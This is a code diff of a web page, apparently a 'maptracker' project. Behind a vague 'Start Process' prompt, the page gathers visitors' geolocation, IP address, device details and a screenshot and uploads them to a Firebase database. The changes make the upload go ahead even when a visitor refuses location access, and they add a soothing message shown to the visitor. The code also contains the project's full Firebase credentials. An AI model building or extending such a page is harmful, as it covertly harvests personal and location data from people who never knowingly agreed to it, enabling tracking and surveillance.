@@ -57,6 +57,10 @@
             color: #ff0000;
             margin: 10px 0;
         }
+        .info-message {
+            color: #ffff00;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
@@ -70,21 +74,21 @@
         <p>Please allow access to your location for the best experience.</p>
         <button class="button" id="start-button">Start Process</button>
         <div id="error-message" class="error-message"></div>
+        <div id="info-message" class="info-message"></div>
     </div>
 
     <script type="module">
         const firebaseConfig = {
-            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4", // Your API Key
-            authDomain: "maptracker-7afb6.firebaseapp.com", // Your Auth Domain
-            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com", // Your Database URL
-            projectId: "maptracker-7afb6", // Your Project ID
-            storageBucket: "maptracker-7afb6.appspot.com", // Your Storage Bucket
-            messagingSenderId: "874600101063", // Your Messaging Sender ID
-            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2", // Your App ID
-            measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
+            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4",
+            authDomain: "maptracker-7afb6.firebaseapp.com",
+            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com",
+            projectId: "maptracker-7afb6",
+            storageBucket: "maptracker-7afb6.appspot.com",
+            messagingSenderId: "874600101063",
+            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2",
+            measurementId: "G-HTXZEYZ3DK"
         };
 
-        // Initialize Firebase
         const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
         const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
 
@@ -93,17 +97,19 @@
         
         const loadingScreen = document.getElementById('loading-screen');
         const errorMessage = document.getElementById('error-message');
+        const infoMessage = document.getElementById('info-message');
 
         document.getElementById('start-button').addEventListener('click', startProcess);
 
         async function startProcess() {
             errorMessage.innerHTML = ''; // Clear previous errors
+            infoMessage.innerHTML = ''; // Clear previous info messages
             loadingScreen.style.display = 'flex'; // Show loading screen
             
             try {
                 // Get the user's geolocation
                 const position = await getLocation();
-                
+
                 // Create a unique session ID
                 const sessionId = Date.now();
 
@@ -115,6 +121,7 @@
                 
             } catch (error) {
                 errorMessage.innerHTML = error.message;
+                infoMessage.innerHTML = "You can still continue with other actions.";
             } finally {
                 loadingScreen.style.display = 'none'; // Hide loading screen
             }
@@ -126,7 +133,13 @@
                 if (!navigator.geolocation) {
                     return reject(new Error("Geolocation is not supported by your browser."));
                 }
-                navigator.geolocation.getCurrentPosition(resolve, reject);
+                navigator.geolocation.getCurrentPosition(resolve, (error) => {
+                    if (error.code === error.PERMISSION_DENIED) {
+                        resolve({ coords: { latitude: null, longitude: null } }); // Skip to next step if denied
+                    } else {
+                        reject(error); // Reject if another error occurs
+                    }
+                });
             });
         }
 
@@ -160,7 +173,6 @@
 
         // Function to get device information
         async function getDeviceInfo() {
-            const ipAddress = await getIpAddress();
             return {
                 userAgent: navigator.userAgent,
                 deviceMemory: navigator.deviceMemory || 'N/A', // Device memory in GB
@@ -168,7 +180,7 @@
                 screenResolution: `${window.screen.width} x ${window.screen.height}`, // Screen resolution
                 language: navigator.language || 'en-US', // User language
                 platform: navigator.platform || 'N/A', // User platform
-                ipAddress: ipAddress // User IP address
+                ipAddress: await getIpAddress() // User IP address
             };
         }
 
@@ -189,8 +201,10 @@
                 longitude: position.coords.longitude,
                 timestamp: Date.now(),
                 screenshot: screenshot,
-                ...deviceInfo // Spread device info into session data
+                ...deviceInfo, // Spread device info into session data
+                locationAccess: position.coords.latitude !== null // Check if location access was granted
             };
+
             const dataRef = ref(database, 'sessions/' + sessionId);
             await set(dataRef, sessionData);
             console.log('Session data uploaded successfully');
